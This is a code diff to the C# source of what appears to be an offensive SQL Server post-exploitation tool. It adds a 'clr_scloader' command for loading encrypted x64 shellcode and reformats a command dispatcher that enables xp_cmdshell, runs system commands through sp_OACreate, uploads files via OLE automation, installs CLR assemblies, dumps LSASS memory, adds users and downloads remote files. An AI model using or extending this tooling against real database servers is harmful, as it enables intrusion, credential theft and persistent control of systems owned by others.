@@ -33,6 +33,7 @@ uninstall_clr              - drop clr
 clr_dumplsass              - dumplsass by clr
 clr_adduser {user} {pass}  - add user by clr
 clr_download {url} {path}  - download file from url by clr
+clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
 exit                       - terminates the server process (and this session)"
 );
         }
@@ -136,7 +137,7 @@ exit                       - terminates the server process (and this session)"
                 }
             }
             return arrlist;
-         }
+        }
 
         /// <summary>
         /// 文件上传，使用 OLE Automation Procedures 的 ADODB.Stream
@@ -172,17 +173,17 @@ exit                       - terminates the server process (and this session)"
                         EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL,'{1}', 2
                         EXEC sp_OAMethod @ObjectToken, 'Close'
                         EXEC sp_OADestroy @ObjectToken", hex150000, filePath);
-                     Batch.RemoteExec(Conn, sqlstr, false);
-                     if (setting.File_Exists(filePath, 1))
-                     {
-                         Console.WriteLine("[+] {0}-{1} Upload completed", arrlist.Count, count);
-                     }
-                     else
-                     {
-                         Console.WriteLine("[!] {0}-{1} Error uploading", arrlist.Count, count);
-                         Conn.Close();
-                         Environment.Exit(0);
-                     }
+                    Batch.RemoteExec(Conn, sqlstr, false);
+                    if (setting.File_Exists(filePath, 1))
+                    {
+                        Console.WriteLine("[+] {0}-{1} Upload completed", arrlist.Count, count);
+                    }
+                    else
+                    {
+                        Console.WriteLine("[!] {0}-{1} Error uploading", arrlist.Count, count);
+                        Conn.Close();
+                        Environment.Exit(0);
+                    }
 
                     Thread.Sleep(5000);
                 }
@@ -352,6 +353,13 @@ exit                       - terminates the server process (and this session)"
                                 clr_exec(s);
                                 break;
                             }
+                        case "clr_scloader":
+                            {
+                                String s = String.Empty;
+                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
+                                clr_exec(s);
+                                break;
+                            }
                         case "clr_download":
                             {
                                 String s = String.Empty;
@@ -398,7 +406,8 @@ exit                       - terminates the server process (and this session)"
 
         static void Noninteractive(string[] args)
         {
-            if (args.Length < 4) {
+            if (args.Length < 4)
+            {
                 Help();
                 return;
             }
@@ -424,17 +433,17 @@ exit                       - terminates the server process (and this session)"
             setting = new Setting(Conn);
             try
             {
-                   // string[] cmdline = str.Split(new char[] { ' ' }, 3);
+                // string[] cmdline = str.Split(new char[] { ' ' }, 3);
 
-                    switch (module.ToLower())
-                    {
-                        case "enable_xp_cmdshell":
-                            setting.Enable_xp_cmdshell();
-                            break;
-                        case "disable_xp_cmdshell":
-                            setting.Disable_xp_cmdshell();
-                            break;
-                        case "xp_cmdshell":
+                switch (module.ToLower())
+                {
+                    case "enable_xp_cmdshell":
+                        setting.Enable_xp_cmdshell();
+                        break;
+                    case "disable_xp_cmdshell":
+                        setting.Disable_xp_cmdshell();
+                        break;
+                    case "xp_cmdshell":
                         {
                             String command = String.Empty;
                             if (args.Length > 5)
@@ -448,7 +457,7 @@ exit                       - terminates the server process (and this session)"
                             xp_shell(command);
                             break;
                         }
-                        case "sp_oacreate":
+                    case "sp_oacreate":
                         {
                             {
                                 String command = String.Empty;
@@ -464,61 +473,68 @@ exit                       - terminates the server process (and this session)"
                                 break;
                             }
                         }
-                        case "upload":
-                            UploadFiles(args[4], args[5]);
-                            break;
-                        case "download":
-                            DownloadFiles(args[5], args[4]);
-                            break;
-                        case "enable_ole":
-                            setting.Enable_ola();
-                            break;
-                        case "disable_ole":
-                            setting.Disable_ole();
-                            break;
-                        case "clr_dumplsass":
-                            clr_exec("clr_dumplsass");
-                            break;
-                        case "clr_adduser":
-                            {
-                                String s = String.Empty;
-                                for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
-                                clr_exec(s);
-                                break;
-                            }
-                        case "clr_download":
-                            {
+                    case "upload":
+                        UploadFiles(args[4], args[5]);
+                        break;
+                    case "download":
+                        DownloadFiles(args[5], args[4]);
+                        break;
+                    case "enable_ole":
+                        setting.Enable_ola();
+                        break;
+                    case "disable_ole":
+                        setting.Disable_ole();
+                        break;
+                    case "clr_dumplsass":
+                        clr_exec("clr_dumplsass");
+                        break;
+                    case "clr_adduser":
+                        {
                             String s = String.Empty;
                             for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
                             clr_exec(s);
-                                break;
-                            }
-                        case "enable_clr":
-                            setting.Enable_clr();
                             break;
-                        case "disable_clr":
-                            setting.Disable_clr();
+                        }
+                    case "clr_scloader":
+                        {
+                            String s = String.Empty;
+                            for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
+                            clr_exec(s);
                             break;
-                        case "install_clr":
-                            {
-                                setting.Set_permission_set();
-                                setting.CREATE_ASSEMBLY();
-                                setting.CREATE_PROCEDURE();
-                                Console.WriteLine("[+] Install crl successful!");
-                                break;
-                            }
-                        case "uninstall_clr":
-                            setting.drop_clr();
+                        }
+                    case "clr_download":
+                        {
+                            String s = String.Empty;
+                            for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
+                            clr_exec(s);
                             break;
-                        default:
-                            Console.WriteLine(Batch.RemoteExec(Conn, args[3], true));
+                        }
+                    case "enable_clr":
+                        setting.Enable_clr();
+                        break;
+                    case "disable_clr":
+                        setting.Disable_clr();
+                        break;
+                    case "install_clr":
+                        {
+                            setting.Set_permission_set();
+                            setting.CREATE_ASSEMBLY();
+                            setting.CREATE_PROCEDURE();
+                            Console.WriteLine("[+] Install crl successful!");
                             break;
+                        }
+                    case "uninstall_clr":
+                        setting.drop_clr();
+                        break;
+                    default:
+                        Console.WriteLine(Batch.RemoteExec(Conn, args[3], true));
+                        break;
 
-                    }
-                    if (!ConnectionState.Open.Equals(Conn.State))
-                    {
-                        Console.WriteLine("[!] Disconnect....");
-                    }
+                }
+                if (!ConnectionState.Open.Equals(Conn.State))
+                {
+                    Console.WriteLine("[!] Disconnect....");
+                }
                 Conn.Close();
             }
             catch (Exception ex)
